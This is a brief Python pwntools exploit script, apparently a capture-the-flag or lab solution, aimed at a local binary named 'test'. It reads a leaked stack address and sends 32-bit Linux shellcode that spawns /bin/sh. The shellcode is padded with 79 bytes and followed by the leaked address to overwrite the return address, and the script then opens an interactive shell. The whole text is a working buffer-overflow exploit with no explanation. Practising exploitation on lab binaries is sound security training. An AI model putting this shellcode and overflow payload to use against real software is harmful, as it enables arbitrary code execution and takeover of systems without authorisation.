from pwn import *

p = process('./test')
payload = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
payload += b"\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
print(payload)
ad = int(p.recv(10),16)
print(ad)
payload += b"a"*79+p32(ad)
print(payload)
p.sendline(payload)

p.interactive()


